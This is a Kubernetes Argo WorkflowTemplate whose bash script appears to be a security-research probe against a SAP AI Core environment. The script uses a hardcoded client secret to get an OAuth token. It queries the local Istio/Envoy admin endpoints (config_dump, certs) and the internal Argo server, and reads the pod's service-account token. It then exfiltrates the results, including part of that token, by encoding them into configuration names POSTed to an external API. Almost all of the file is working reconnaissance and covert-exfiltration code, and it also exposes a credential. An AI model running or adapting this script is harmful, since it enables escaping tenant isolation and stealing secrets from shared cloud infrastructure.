apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "58.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V58: Localhost istio-proxy admin (15000) + Argo Workflows server (2746)
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v57-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        ARGO="argo-server.argo.svc.cluster.local"
        ARGO_IP=$(dig +short "$ARGO" 2>/dev/null | head -1)
        save "argo-ip-${ARGO_IP:-NXDOMAIN}"
        OUR_NS="rg-3ba0e0a4-cd927cab"
        EXEC_ID=$(printenv AICORE_EXECUTION_ID)
        save "exec-id-${EXEC_ID}"

        # LOCALHOST ISTIO-PROXY ADMIN INTERFACE (15000)
        echo "=== LOCALHOST ISTIO-PROXY 15000 ===" >&2

        # Test the main Envoy admin endpoints that were confirmed reachable in the original finding
        for endpoint in "" "config_dump" "certs" "clusters" "listeners" "stats/prometheus" "server_info" "runtime" "ready"; do
          url="http://localhost:15000/${endpoint}"
          echo "Testing: $url" >&2
          R=$(curl -sk --connect-timeout 5 --max-time 10 "$url" 2>&1 | head -c 300)
          endpoint_clean=$(echo "$endpoint" | tr '/' '-' | tr -c 'a-zA-Z0-9._-' '-')
          endpoint_clean=${endpoint_clean:-root}
          save "istio-15000-${endpoint_clean}-$(echo $R | head -c 100)"
        done

        # Also test localhost:15090/stats/prometheus (Envoy stats port)
        echo "Testing: http://localhost:15090/stats/prometheus" >&2
        R=$(curl -sk --connect-timeout 5 --max-time 10 "http://localhost:15090/stats/prometheus" 2>&1 | head -c 300)
        save "envoy-15090-stats-$(echo $R | head -c 100)"

        # 1. Try port 2746 (correct Argo Workflows port!)
        echo "=== ARGO SERVER 2746 ===" >&2
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/info" 2>&1 | head -c 200)
        save "argo-2746-info-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "http://${ARGO}:2746/api/v1/info" 2>&1 | head -c 200)
        save "argo-2746h-info-$(echo $R | head -c 150)"

        # 2. Try without auth (server mode)
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/version" 2>&1 | head -c 200)
        save "argo-version-$(echo $R | head -c 150)"

        # 3. Try reading our values-extract WorkflowTemplate
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/values-extract" 2>&1 | head -c 300)
        save "argo-wft-values-$(echo $R | head -c 200)"

        # 4. Try reading our own bb14-probe template
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/bb14-probe" 2>&1 | head -c 300)
        save "argo-wft-probe-$(echo $R | head -c 200)"

        # 5. Try listing ALL workflow templates in our namespace
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}" 2>&1 | head -c 300)
        save "argo-wft-list-$(echo $R | head -c 200)"

        # 6. Try reading our own execution's workflow CR (storedWorkflowTemplateSpec!)
        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflows/${OUR_NS}/${EXEC_ID}" 2>&1 | head -c 300)
        save "argo-wf-self-$(echo $R | head -c 200)"

        # 7. Try with pod SA token if available
        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_SA")
        save "sa-token-$(echo ${SA_TOKEN:0:20})"

        if [ "$SA_TOKEN" != "NO_SA" ]; then
          R=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $SA_TOKEN" "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/values-extract" 2>&1 | head -c 300)
          save "argo-sa-wft-$(echo $R | head -c 200)"
        fi

        # 8. Also try direct IP on 2746
        if [ -n "$ARGO_IP" ]; then
          R=$(curl -sk --connect-timeout 5 "https://${ARGO_IP}:2746/api/v1/info" 2>&1 | head -c 200)
          save "argo-ip-2746-$(echo $R | head -c 150)"
        fi

        # 9. Try other ports that argo-server might use
        for port in 2746 8080 8443 443 80; do
          R=$(curl -sk --connect-timeout 2 "http://${ARGO}:${port}/api/v1/info" 2>&1 | head -c 100)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
            save "argo-port-${port}-$(echo $R | head -c 80)"
          fi
        done

        echo "V58 DONE" >&2
